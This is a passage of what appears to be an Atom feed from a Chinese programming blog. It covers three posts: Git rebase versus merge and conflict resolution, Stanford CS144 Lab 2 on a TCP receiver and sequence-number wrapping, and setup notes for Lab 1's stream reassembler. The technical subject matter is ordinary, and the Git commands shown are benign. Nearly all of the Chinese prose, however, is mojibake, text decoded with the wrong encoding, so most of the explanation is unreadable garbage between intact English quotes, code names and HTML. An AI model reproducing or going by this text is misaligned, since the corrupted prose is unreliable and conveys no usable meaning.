src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/rebase.png" alt="rebase.png"><br>é¦–å…ˆå°†æ‰€å¤„åˆ†æ”¯ä¸Šæ‰€æœ‰éå…±æœ‰ commits çš„ä¿®æ”¹ä¿å­˜åœ¨ä¸€ä¸ªæš‚æ—¶çš„æ–‡ä»¶é‡Œï¼Œç„¶åå°†è¯¥åˆ†æ”¯çš„æŒ‡é’ˆæŒ‡åˆ°éœ€è¦ â€œrebase ontoâ€ çš„é‚£ä¸ªåˆ†æ”¯ï¼Œå†å°†åˆšåˆšä¿å­˜çš„ä¿®æ”¹æŒ‰é¡ºåºä½œç”¨åœ¨åˆ†æ”¯ä¸Šã€‚è¿™ä¹ˆè¯»èµ·æ¥ï¼Œå¥½åƒ<code>rebase</code>æ²¡æœ‰<code>merge</code>é‚£ä¹ˆæ¸…æ™°åœ°è®²è§£å¦‚ä½•å¤„ç†ä¸¤ä¸ªåˆ†æ”¯é—´çš„å†²çªçš„ã€‚ç›´è§‰èƒ½æƒ³åˆ°çš„é—®é¢˜æ˜¯ï¼š<strong>å¦‚æœæˆ‘åœ¨ä¸¤ä¸ªåˆ†æ”¯ä¸Šå¯¹åŒä¸€æ–‡ä»¶è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆåœ¨&quot;replay&quot;åä¼šå®ç°æ€ä¹ˆæ ·çš„å–èˆï¼Ÿ</strong></p><blockquote><p>Now, the snapshot pointed to by <code>C4'</code> is exactly the same as the one that was pointed to by <code>C5</code>in the merge example. There is no difference in the end product of the integration, â€¦</p></blockquote><p><em>Pro Git</em> è¯´<code>rebase</code>çš„ç»“æœæ˜¯å’Œ<code>merge</code>æ“ä½œç›¸åŒçš„ï¼Œå¹¶æ²¡æœ‰è§£ç­”é—®é¢˜ã€‚æ‰€ä»¥æˆ‘ä»¬ç›´æ¥åŠ¨æ‰‹æ¥åˆ¶é€  conflict æ¥çœ‹çœ‹<code>rebase</code>ä¼šå‘ç”Ÿä»€ä¹ˆï¼š<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/rebase_conflict.png" alt="rebase_conflict.png"><br>åŸæ¥æ— è®ºæ˜¯<code>merge</code>è¿˜æ˜¯<code>rebase</code>éƒ½æ˜¯ä¼šå‘ç”Ÿå†²çªçš„ï¼æ­¤æ—¶<code>git status</code>æŸ¥çœ‹ä¸€ä¸‹ï¼š<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/rebase_status.png" alt="rebase_status.png"><br>åœ¨<code>unmerge paths</code>çš„ header ä¸‹ï¼Œgit æ˜ç¡®åœ°å‘Šè¯‰äº†æˆ‘ä»¬å¯¹åŒä¸€æ–‡ä»¶çš„åŒä¸€åœ°æ–¹è¿›è¡Œäº†ä¿®æ”¹ï¼Œéœ€è¦æ‰‹åŠ¨æ”¹ä¸€ä¸‹æ–‡ä»¶ï¼Œ<code>add</code>åæäº¤ ğŸ˜„ ã€‚æ‰€ä»¥æ–‡ä¸­æ‰€è¯´çš„&quot;the same&quot;çš„æ„æ€æ˜¯è¯´æˆ‘ä»¬é€šè¿‡åŒæ ·çš„ç­–ç•¥æ¶ˆé™¤å†²çªï¼Œæœ€ç»ˆå¾—åˆ°çš„ snapshot å’Œ<code>merge</code>æ“ä½œå¾—åˆ°çš„ snapshot æ˜¯ä¸€æ ·çš„ã€‚<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/eliminate.png" alt="eliminate.png"><br>å¾ˆé«˜å…´ï¼Œæˆ‘ä»¬è§£å†³äº†<code>rebase</code>çš„å†²çªï¼é‚£ä¹ˆå°†è¿™ä¸ªæƒ…å†µå»¶ç”³åˆ°æœ¬åœ°åˆ†æ”¯å’Œè¿œç«¯åˆ†æ”¯å‘¢ä¼šå‘ç”Ÿï¼Ÿä¸€æ ·çš„é—®é¢˜ï¼Œä¸€æ ·çš„æ“ä½œï¼æˆ‘ä»¬åªéœ€è¦æŠŠä¾‹å­ä¸­çš„<code>test</code>æ¢åšæŸä¸ªè¿œç«¯åˆ†æ”¯ï¼ˆä¾‹å¦‚<code>origin/main</code>ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>fetch</code>+<code>merge</code>çš„ comboï¼Œè¿™å°±ç›¸å½“äºæœ¬åœ°åˆ†æ”¯çš„<code>merge</code>äº†ï¼Œæˆ–è€…ç›´æ¥<code>git pull --rebase</code>å°†è¿œç«¯åˆ†æ”¯æ”¾åˆ°å½“å‰åˆ†æ”¯åé¢ï¼Œç›¸å½“äºæœ¬åœ°çš„<code>rebase</code>ã€‚é‡åˆ° conflict é—®é¢˜è¿˜æ˜¯åŒæ ·è¦è§£å†³çš„ï¼<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/rebase_remote.png" alt="rebase_remote.png"><br><code>rebase</code>å’Œ<code>merge</code>ç›¸æ¯”ï¼Œå®ƒèƒ½ä½¿å¾—æˆ‘ä»¬çš„å†å²çœ‹èµ·æ¥æ›´åŠ çº¿æ€§å¹²å‡€ã€‚ä¸€äº›äººè®¤ä¸º<code>merge</code>æ›´å¥½ï¼Œå› ä¸ºå®ƒèƒ½ä¿å­˜æ•´ä¸ª commit å†å²ï¼Œèƒ½ä»ä¸­çŸ¥é“æ¯ä¸€æ¬¡<code>commit</code>ã€<code>merge</code>çš„è¿‡ç¨‹å’Œç»“æœï¼Œå°†å†å²è§†ä¸º&quot;<strong>record of what actually happened</strong>&quot;ï¼›å¦ä¸€äº›äººåˆ™è®¤ä¸º<code>rebase</code>æ›´åŠ å·ï¼Œå®ƒé˜è¿°çš„æ˜¯æ•´ä¸ªé¡¹ç›®çš„è¿‡ç¨‹æ˜¯å¦‚ä½•ä¸€ç‚¹ç‚¹æ„å»ºçš„ï¼Œå°±åƒæˆ‘ä»¬ä¸ä¼šæŠŠä¸€ä¸ªåˆç¨¿ç›´æ¥æäº¤ä¸€æ ·ï¼Œso why show your messy work? ä»–ä»¬å°†å†å²è§†ä¸º&quot;<strong>story of how your project was made</strong>&quot;ã€‚é‚£ä¹ˆï¼Œä½ åå¥½å“ªä¸€ç§å‘¢ï¼Ÿ</p><h1 id="æ€»ç»“"><a class="markdownIt-Anchor" href="#æ€»ç»“"></a> æ€»ç»“</h1><p>è¿™ç¯‡åšæ–‡åªæ˜¯æ€»ç»“è§£é‡Šäº† Git çš„ä¸€äº›åŸºç¡€æ¦‚å¿µå’Œæ“ä½œï¼Œè€Œæ²¡æœ‰æ€»ç»“ Git å…·ä½“çš„å®ç°ï¼Œå¦‚ protocolã€internals ç­‰ã€‚å½“ç„¶å•¦æˆ‘ä¹Ÿæ²¡çœ‹å°±æ˜¯äº†ï¼Œå¦‚æœæ„Ÿå…´è¶£çš„è¯å¯ä»¥ç›´æ¥åœ¨<a href="https://git-scm.com/book/en/v2">git å®˜ç½‘</a>è¯» <em>Pro Git</em>ï¼Œä¸ªäººæ„Ÿè§‰è®²çš„éå¸¸ä¹‹å¥½ï¼Œè¾¹åŠ¨æ‰‹è¾¹å­¦ä¹ ï¼Œè¯»ä¸‹æ¥çœŸçš„å—ç›ŠåŒªæµ…ã€‚ç”±äºæˆ‘æ˜¯è¯»çš„è‹±æ–‡ç‰ˆè€Œä¸”è¿˜æ•´ç†åšå®¢ç¬”è®°ï¼Œç®—èµ·æ¥èŠ±äº†æœ‰ 20h+ï¼ˆä¸»è¦æ˜¯è‹±è¯­å¤ªèœäº†ï¼‰ï¼Œä¸è¿‡åœ¨è¿™äº›å­¦ä¹ æ—¶é—´é‡Œæˆ‘éƒ½æ„Ÿè§‰éå¸¸å……å®ï¼æ‰€ä»¥ï¼Œæˆ‘èƒ½ç®—å¾—ä¸Š<strong>å¬è¯´è¿‡</strong> Git äº†å—ï¼Ÿ</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#å‰è¨€&quot;&gt;&lt;/a&gt; å‰è¨€&lt;/h1&gt;
&lt;p&gt;ä¸ŠåŠå¹´æ­å»ºå®Œåšå®¢ååˆæ­¥äº†è§£äº†ä¸€ä¸‹ git çš„å¸¸ç”¨æŒ‡ä»¤ï¼Œç¬¬ä¸€æ¬¡äº†è§£ git è¿™ä¸ªç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œä¹‹ååˆé›¶é›¶æ•£æ•£åœ°é€šè¿‡ä¸åŒæ…•è¯¾å’Œè§†é¢‘ï¼ˆ&lt;em&gt;&lt;a h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Standford CS144 Lab 2</title>
    <link href="http://example.com/2024/09/15/CS144-Lab2/"/>
    <id>http://example.com/2024/09/15/CS144-Lab2/</id>
    <published>2024-09-15T08:59:30.128Z</published>
    <updated>2024-09-25T08:42:50.471Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å®éªŒæ€»è§ˆ"><a class="markdownIt-Anchor" href="#å®éªŒæ€»è§ˆ"></a> å®éªŒæ€»è§ˆ</h1><p>å®˜æ–¹æ–‡æ¡£å¯¹å®éªŒçš„æè¿°å¦‚ä¸‹ï¼š</p><blockquote><p>In Lab 2, you will implement the <code>TCPReceiver</code>, the part of a TCP implementation that handles the incoming byte stream. The <code>TCPReceiver</code> translates between incoming TCP segments (the payloads of datagrams carried over the Internet) and the incoming byte stream.</p><p>The <code>TCPReceiver</code> receives segments from the Internet (via the <code>segment received()</code>method) and turns them into calls to your StreamReassembler, which eventually writes to the incoming ByteStream. Applications read from this ByteStream, just as you did in Lab 0 by reading from the TCPSocket.</p></blockquote><p>åœ¨ Lab2 ä¸­ï¼Œæˆ‘ä»¬è¦å®Œæˆ TCP æ¡†æ¶ä¸­çš„<code>TCPReceiver</code>ç»„ä»¶ï¼ˆå…¶ä¸­åŒ…æ‹¬æˆ‘ä»¬å·²ç»å®ç°çš„<code>SreamAssembler</code>å’Œ<code>ByteStream</code>æ¨¡å—ï¼‰ã€‚è¿™ä¸ªç»„ä»¶çš„åŠŸèƒ½æœ‰ä¸‰ï¼š</p><ol><li>æ¥å—æ•°æ®æŠ¥åˆ†ç‰‡<code>TCPSegement(the actual datagram payloads)</code>ï¼Œå¹¶ä¸”å°†å…¶æ•°æ®æŠ¥ä¸­çš„æ•°æ®æå–å‡ºæ¥ï¼Œè¾“å…¥åˆ°æˆ‘ä»¬ä¸Šä¸ªå®éªŒå®ç°çš„<code>StreamAssembler</code>ä¸­ã€‚</li><li>å®ç°æµé‡æ§åˆ¶(<strong>flow control</strong>)ï¼Œå› æ­¤æˆ‘ä»¬è¦ä¸æ–­å‘<code>TCPSender</code>æŠ¥å‘Šæ»‘åŠ¨çª—å£(<strong>sliding window</strong>)å¤§å°ã€‚</li><li>é€šè¿‡<code>segment</code>çš„åºåˆ—å·ä¿éšœæ•°æ®çš„å¯é ä¼ è¾“ã€‚</li></ol><h1 id="ç¬¬ä¸€éƒ¨åˆ†64-bits-ä¸-32-bits-åºåˆ—å·é—´è½¬æ¢"><a class="markdownIt-Anchor" href="#ç¬¬ä¸€éƒ¨åˆ†64-bits-ä¸-32-bits-åºåˆ—å·é—´è½¬æ¢"></a> ç¬¬ä¸€éƒ¨åˆ†ï¼š64-bits ä¸ 32-bits åºåˆ—å·é—´è½¬æ¢</h1><h2 id="ä¸ºä»€ä¹ˆéœ€è¦åšè½¬æ¢"><a class="markdownIt-Anchor" href="#ä¸ºä»€ä¹ˆéœ€è¦åšè½¬æ¢"></a> ä¸ºä»€ä¹ˆéœ€è¦åšè½¬æ¢</h2><ol><li>TCP æŠ¥æ–‡æ®µçš„åºåˆ—å·(sequence number)å­—æ®µçš„æœ€å¤§é•¿åº¦æ˜¯ 32 å­—èŠ‚ï¼Œè€Œæˆ‘ä»¬çš„é€»è¾‘æ•°æ®æµçš„æ¯ä¸ªå­—èŠ‚åºå·(absolute sequence number)çš„æœ€å¤§é•¿åº¦æ˜¯ 64 å­—èŠ‚ï¼Œæ‰€ä»¥<code>sequence number</code>åœ¨è¾¾åˆ°æœ€å¤§<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>32</mn></msup><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{32}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>åä¼šé‡æ–°ä»<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>å¼€å§‹å¾ªç¯ã€‚</li><li>ä¸ºäº†å®‰å…¨è€ƒè™‘ï¼Œåœ¨ TCP è¿æ¥çš„ä¸‰æ¬¡æ¡æ‰‹é˜¶æ®µï¼Œ<code>receiver</code>ä¼šéšæœºåˆå§‹åŒ–åºå·<code>isn</code>(initial sequence number, 32-bits)ï¼Œ è€Œæˆ‘ä»¬çš„é€»è¾‘æµçš„ç¬¬ä¸€ä¸ªåºå·(64-bits)æ°¸è¿œæ˜¯ 0ã€‚<br>ä¸‹è¡¨æ¥è‡ªæ–‡æ¡£ï¼Œè¡¨ç¤ºåªåŒ…å«&quot;cat&quot;ä¸‰ä¸ªå­—èŠ‚çš„å­—èŠ‚æµï¼š<img src="/2024/09/15/CS144-Lab2/seqno.png" alt="seqno"></li></ol><h2 id="è½¬æ¢çš„æ¥å£"><a class="markdownIt-Anchor" href="#è½¬æ¢çš„æ¥å£"></a> è½¬æ¢çš„æ¥å£</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// convert absolute seqno(64-bits) to seqno(32-bits)</span></span><br><span class="line"><span class="function">WrappingInt32 <span class="title">wrap</span><span class="params">(<span class="type">uint64_t</span> n, WrappingInt32 isn)</span></span></span><br><span class="line"><span class="function"><span class="comment">// convert seqno(32-bits) to absolute seqno(64-bits)</span></span></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">unwrap</span><span class="params">(WrappingInt32_n, WrappingInt32_isn, <span class="type">uint64_t</span> checkpoint)</span></span></span><br></pre></td></tr></table></figure><p>å®ç°æ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>SYN</code>å’Œ<code>FIN</code>ä¹Ÿæ˜¯å æ®ä¸€ä¸ªåºåˆ—å·çš„ï¼Œè™½ç„¶å®ƒä»¬ä¸æ˜¯ä¸€ä¸ªæŠ¥æ–‡æ®µä¹Ÿä¸æ˜¯è¡¨ç¤º payload æ•°æ®çš„å­—èŠ‚ï¼Œä»…è¡¨ç¤ºåºåˆ—å·çš„èµ·å§‹å’Œç»“å°¾ï¼å…·ä½“çš„å®ç°å‚è€ƒäº†<a href="https://lrl52.top/998/cs144-lablab2/">CS144 Labï¼šLab2 â€“ LRL52 çš„åšå®¢</a>ã€‚</p><h1 id="ç¬¬äºŒéƒ¨åˆ†å®Œå–„-tcp-receiver-çš„é€»è¾‘"><a class="markdownIt-Anchor" href="#ç¬¬äºŒéƒ¨åˆ†å®Œå–„-tcp-receiver-çš„é€»è¾‘"></a> ç¬¬äºŒéƒ¨åˆ†ï¼šå®Œå–„ TCP receiver çš„é€»è¾‘</h1><p><img src="/2024/09/15/CS144-Lab2/evolution.png" alt="evolution"><br>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œ<code>TCP receiver</code>æœ‰å››ç§çŠ¶æ€ï¼š</p><ul><li><code>LISTEN</code>ï¼šåˆå§‹åŒ–<code>receiver</code>åè¿˜æœªä¸<code>sender</code>è¿›è¡Œ three-way hand shakeï¼Œç›¸å½“ä¸<code>client-server</code>æ¨¡å‹ä¸­çš„<code>server</code>å¤„äºç›‘å¬çŠ¶æ€ï¼Œç›‘å¬æ¥è‡ª<code>client</code>çš„è¿æ¥è¯·æ±‚ã€‚æ­¤æ—¶<code>SYN</code>åˆå§‹åŒ–åºåˆ—å·è¿˜æœªç¡®å®šï¼Œæ‰€ä»¥æ— æ³•è¿›è¡Œæ¥å‘åŒ…ã€‚</li><li><code>SYN_RECV</code>ï¼šå¤„äºæ•°æ®äº¤æ¢é˜¶æ®µï¼Œè¿˜æœªæ¥å—åˆ°åŒ…å«<code>FIN</code>å­—æ®µçš„æ•°æ®åŒ…ï¼Œå› æ­¤è¿æ¥æŒç»­ã€‚</li><li><code>FIN_RECV</code>ï¼šæ¥å—åˆ°<code>FIN</code>çš„æ•°æ®åŒ…ï¼Œè€Œä¸”é€šè¿‡é‡ç»„å·²ç»è¾“å…¥åˆ°<code>ByteStream</code>ä¸­ï¼Œæ•°æ®ä¼ è¾“å·²ç»å®Œæˆï¼Œä¸å†æ¥å—æ•°æ®æŠ¥ã€‚</li><li><code>ERROR</code>ï¼š é”™è¯¯çŠ¶æ€ã€‚</li></ul><h2 id="æµ‹è¯•ç»“æœ"><a class="markdownIt-Anchor" href="#æµ‹è¯•ç»“æœ"></a> æµ‹è¯•ç»“æœ</h2><p><img src="/2024/09/15/CS144-Lab2/test.png" alt="test"></p><h1 id="æ€»ç»“"><a class="markdownIt-Anchor" href="#æ€»ç»“"></a> æ€»ç»“</h1><p>å®éªŒçš„ç¬¬ä¸€éƒ¨åˆ†æ¶‰åŠç»å¯¹åºå· (64-bits)å’Œæµåºå· (32-bits)ä¹‹é—´çš„è½¬æ¢ï¼Œéœ€è¦æ³¨æ„çš„ç»†èŠ‚è¿˜æ˜¯å¾ˆå¤šçš„ã€‚ç¬¬äºŒéƒ¨åˆ†æˆ‘èŠ±äº†å¾ˆå¤šæ—¶é—´ç²¾åŠ›å»çœ‹<code>tcp_header</code>å’Œ<code>tcp_segment</code>çš„æ¥å£ï¼Œæçš„å¾ˆè¿·ç³Šï¼Œæœ€åè¿˜æ˜¯æ²¡å¿ä½å»å‚è€ƒäº†ç½‘ä¸Šçš„å®ç°ï¼Œå‘ç°åŸºæœ¬ä¸Šå°±æ²¡æœ‰ç”¨åˆ°ã€‚ã€‚æˆ‘è§‰å¾—è¿˜æ˜¯è‡ªå·±åœ¨è¿™æ–¹é¢çš„ç†è®ºæ²¡æœ‰å·©å›ºå¾—ç‰¹åˆ«å¥½ï¼Œæ‰€ä»¥è¿™ä¸ªå®éªŒä»å¤´åˆ°å°¾éƒ½åšåœ°ç£•ç£•ç»Šç»Šã€‚<br><img src="/2024/09/15/CS144-Lab2/%E6%A1%86%E6%9E%B6.png" alt="æ¡†æ¶"><br>å›åˆ° TCP ç»“æ„å›¾ä¸­çœ‹è¿™ä¸ªå®éªŒï¼Œæˆ‘ä»¬å®ç°äº†<code>TCPReceiever</code>ï¼Œå®ƒå°†æ¥å—ä»<code>Sender</code>ä¼ æ¥çš„ TCP æŠ¥æ–‡æ®µï¼Œä»ä¸­æå–è´Ÿè½½çš„æŠ¥æ–‡å¹¶è¾“å…¥åˆ°ä¹‹å‰å®ç°çš„<code>Reassembler</code>ä¸­ã€‚ä¸ºäº†å®ç°æµé‡æ§åˆ¶ï¼Œæˆ‘ä»¬è¿˜è®¡ç®—äº†å½“å‰æ»‘åŠ¨çª—å£çš„å¤§å°ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æŠ¥å‘Šç»™<code>Sender</code>ï¼Œè¿™ä¼šåœ¨ä¸‹ä¸€ä¸ªå®éªŒå®ç°ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å®éªŒæ€»è§ˆ&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#å®éªŒæ€»è§ˆ&quot;&gt;&lt;/a&gt; å®éªŒæ€»è§ˆ&lt;/h1&gt;
&lt;p&gt;å®˜æ–¹æ–‡æ¡£å¯¹å®éªŒçš„æè¿°å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In Lab 2, you will implement the</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Standford CS144 Lab 1</title>
    <link href="http://example.com/2024/08/11/CS144-Lab1/"/>
    <id>http://example.com/2024/08/11/CS144-Lab1/</id>
    <published>2024-08-11T00:47:37.184Z</published>
    <updated>2024-09-14T00:53:46.531Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lab-1-é¡¹ç›®æ„å»º"><a class="markdownIt-Anchor" href="#lab-1-é¡¹ç›®æ„å»º"></a> Lab 1 é¡¹ç›®æ„å»º</h1><p><img src="/2024/08/11/CS144-Lab1/startcode.png" alt="startcode.png"><br>ç”±äºæˆ‘å¯¹<code>git</code>ä¸æ˜¯å¾ˆç†Ÿç»ƒï¼Œæ‰€ä»¥æ‹‰å–å’Œåˆå¹¶çš„æ“ä½œæœ‰ç‚¹éº»çƒ¦ã€‚é¦–å…ˆ<code>git clone -b lab1-startercode &lt;url&gt;</code>æ‹‰å–çš„æ˜¯åˆ«äººä»“åº“ lab1 çš„ start code åˆ°æœ¬åœ°ï¼Œç„¶å<code>git remote rm origin</code>åˆ é™¤ä¸è¿œç«¯ä»“åº“çš„è”ç³»ï¼Œ<code>git remote add origin &lt;git@github.com:usrname/reposname.git&gt;</code>å’Œè‡ªå·±çš„è¿œç«¯ä»“åº“è”ç³»ï¼ˆ<code>&lt;url&gt;</code>çš„è¯<code>GitHub</code>å·²ç»ä¸æ”¯æŒç”¨æˆ·å¯†ç ç™»å½•äº†ï¼Œæœ€å¥½æ˜¯ç”¨<code>SSH</code>ï¼‰ï¼Œå†<code>push</code>åˆ°è¿œç«¯çš„ä¸€ä¸ªæ–°çš„åˆ†æ”¯ä¸Šï¼ˆæˆ‘çš„åˆ†æ”¯åç§°å«<code>lab1</code>ï¼Œç”¨æ¥ä¿å­˜<code>starter code</code>ï¼‰ã€‚æ¥ç€å°±å’Œæ–‡æ¡£ç»™å‡ºçš„æ­¥éª¤ä¸€æ ·ï¼Œ<code>git fetch</code>åŒæ­¥ä¸€ä¸‹ï¼Œç„¶å<code>git merge origin/lab1</code>ï¼Œä¸å‡ºæ‰€æ–™ä¼šå‘ç”Ÿ<code>merge conflict</code>ã€‚<br><img src="/2024/08/11/CS144-Lab1/merge.png" alt="merge.png"><br>ä¸ç”¨æ…Œï¼Œè¿›åˆ°æ–‡ä»¶å¤¹é‡Œä¸€ç‚¹ç‚¹ merge å°±å¥½ã€‚å†²çªè§£å†³å®Œå<code>git add</code> -&gt;<code>git commit</code>-&gt;<code>git push</code>è¡Œäº‘æµæ°´æ¨åˆ° lab0 çš„åˆ†æ”¯ä¸Šï¼Œæœ€å<code>make</code>ç¼–è¯‘å®Œæˆäº†é¡¹ç›®åˆå§‹åŒ–ã€‚</p><h1 id="å®éªŒè¦æ±‚"><a class="markdownIt-Anchor" href="#å®éªŒè¦æ±‚"></a> å®éªŒè¦æ±‚</h1><h2 id="æ€»è§ˆ-lab-01234-æ¡†æ¶"><a class="markdownIt-Anchor" href="#æ€»è§ˆ-lab-01234-æ¡†æ¶"></a> æ€»è§ˆ Lab 0/1/2/3/4 æ¡†æ¶</h2><p><img src="/2024/08/11/CS144-Lab1/%E6%A1%86%E6%9E%B6.png" alt="æ¡†æ¶.png"></p><blockquote><p>Figure: The arrangement of modules and dataflow in your TCP implementation. <strong>The ByteStream was Lab 0.</strong> The job of TCP is to convey two ByteStreams (one in each direction) over an unreliable datagram network, so that bytes written to the socket on one side of the connection emerge as bytes that can be read at the peer, and vice versa. <strong>Lab 1 is the StreamReassembler, and in Labs 2, 3, and 4 youâ€™ll implement the TCPReceiver, TCPSender, and then the TCPConnection to tie it all together.</strong></p></blockquote><p>æ•´ä¸ªå®éªŒå°† TCP æ¨¡å—åŒ–åˆ†å¼€æ¥å®Œæˆï¼Œæœ€åæŠŠå‡ ä¸ªç»„ä»¶åˆåœ¨ä¸€èµ·å®ç° TCPã€‚åœ¨<code>Lab 0</code>çš„<code>webget</code>å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨äº†ç³»ç»Ÿæä¾›çš„ TCPï¼ˆ<code>&quot;using Linuxâ€™s built-in implementation of the Transmission Control Protocol (TCP)&quot;</code>ï¼‰ï¼Œåœ¨æ­¤ä¹‹ä¸Šæˆ‘ä»¬ä½¿ç”¨ TCP æä¾›çš„æœåŠ¡å®ç°äº†å®¢æˆ·ç«¯<code>socket</code>ã€‚è€Œæ¥ä¸‹æ¥æˆ‘ä»¬æŠŠè§†è§’ç§»åŠ¨åˆ° socket é¢å‘è¿è¾“å±‚çš„ä¸€ç«¯ï¼Œå°†å®ç°è‡ªå·±çš„ TCPï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦<strong>åœ¨ä¸€ä¸ªä¸å¯é çš„ç½‘ç»œï¼ˆç½‘ç»œå±‚ï¼‰ä¸Šå®ç°å¯¹ä¸Šå±‚ï¼ˆåº”ç”¨å±‚ï¼‰æä¾›çš„æœåŠ¡</strong>ã€‚</p><blockquote><p><strong>Over the next four weeks, youâ€™ll implement TCP, to provide the byte-stream abstraction between a pair of computers separated by an unreliable datagram network.</strong></p></blockquote><h2 id="lab-1-è¦æ±‚"><a class="markdownIt-Anchor" href="#lab-1-è¦æ±‚"></a> Lab 1 è¦æ±‚</h2><blockquote><p>In Lab 1, youâ€™ll implement a <strong>stream reassembler</strong>â€”a module that stitches small pieces of the byte stream (known as substrings, or segments) back into a contiguous stream of bytes in the correct sequence.</p></blockquote><p>åœ¨<code>Lab 1</code>ä¸­ï¼Œæˆ‘ä»¬å°†è¦å®Œæˆä¸€ä¸ªæµé‡ç»„å™¨ï¼ˆstream reassemblerï¼‰ï¼Œåœ¨ä¸Šé¢çš„æ¡†æ¶ä¸­å¯ä»¥çœ‹åˆ°å®ƒæ˜¯æˆ‘ä»¬å®ç°<code>TCPReceiver</code>ç»„ä»¶çš„ä¸€ä¸ªå­ç»„ä»¶ï¼Œå…¶åŠŸèƒ½ä¹Ÿå¾ˆæ¸…æ™°ï¼šç”±äºç½‘ç»œä¸å¯é ï¼Œæ‰€ä»¥æ•°æ®æŠ¥å¯èƒ½ä¸¢å¤±ã€å¤±åºæˆ–è€…é‡å¤ï¼ˆæ²¡æœ‰è€ƒè™‘å‡ºé”™ï¼‰ï¼Œæµé‡ç»„å™¨è¯»å–è¿™äº›æ•°æ®æŠ¥å¹¶å°†å®ƒä»¬è½¬æ¢ä¸ºå¯é çš„å­—èŠ‚æµï¼Œå†™å…¥<code>BytesSream</code>ä¸­ã€‚</p><h1 id="ç¼–å†™ä»£ç å’Œè°ƒè¯•"><a class="markdownIt-Anchor" href="#ç¼–å†™ä»£ç å’Œè°ƒè¯•"></a> ç¼–å†™ä»£ç å’Œè°ƒè¯•</h1><h2 id="å…³äºå®ç°çš„æ€è€ƒ"><a class="markdownIt-Anchor" href="#å…³äºå®ç°çš„æ€è€ƒ"></a> å…³äºå®ç°çš„æ€è€ƒ</h2><p>æˆ‘ä»¬è¦å®ç°çš„ï¼Œå…¶å®å°±æ˜¯åœ¨<code>capacity</code>å¤§å°çš„å†…å­˜é™åˆ¶ä¸‹ï¼Œå®Œæˆå­å­—ç¬¦ä¸²çš„åˆå¹¶ï¼è¯´èµ·åˆå¹¶ï¼Œæˆ‘è®°èµ·ä¹‹å‰åœ¨ Leetcode ä¸Šåšè¿‡ä¸€é“<a href="https://leetcode.cn/problems/SsGoHC/description/">æ•°ç»„åˆå¹¶çš„é—®é¢˜</a>ï¼Œè¿˜æƒ³åˆ°äº† B æ ‘çš„åˆå¹¶ã€‚</p><p>å¯¹äºå®¹å™¨çš„é€‰æ‹©ï¼ˆæˆ‘çš„ C++ä¸ç†Ÿç»ƒï¼Œå¾ˆå¤šå®¹å™¨éƒ½ä¸äº†è§£ï¼‰ï¼Œæˆ‘çœ‹ç½‘ä¸Šæœ‰äº›æœ‹å‹ä½¿ç”¨<code>std::vertor</code>ï¼Œä¹Ÿæœ‰é€‰<code>std::set</code>æ¨¡æ‹Ÿç¼“å†²åŒºçš„ï¼Œè¿˜æœ‰é€‰<code>std::map</code>çš„ã€‚æˆ‘é€‰æ‹©çš„æ˜¯<code>std::map</code>ï¼Œ<code>key</code>æ˜¯<code>size_t</code>ç±»å‹è€Œ<code>value</code>æ˜¯<code>string</code>ç±»å¯¹è±¡ï¼Œå¥½åƒè¿ç”¨ä¸åˆ°å‰é¢æ— ç«¯è”æƒ³çš„ä¸œè¥¿ã€‚ä¸å¾—ä¸è¯´<code>map</code>è¿›è¡Œåˆå¹¶å®åœ¨æ˜¯å¤ªç¹çäº†ï¼Œè¦è€ƒè™‘åˆ°å¾ˆå¤šç§æƒ…å†µï¼ˆé‡å¤ä»£ç 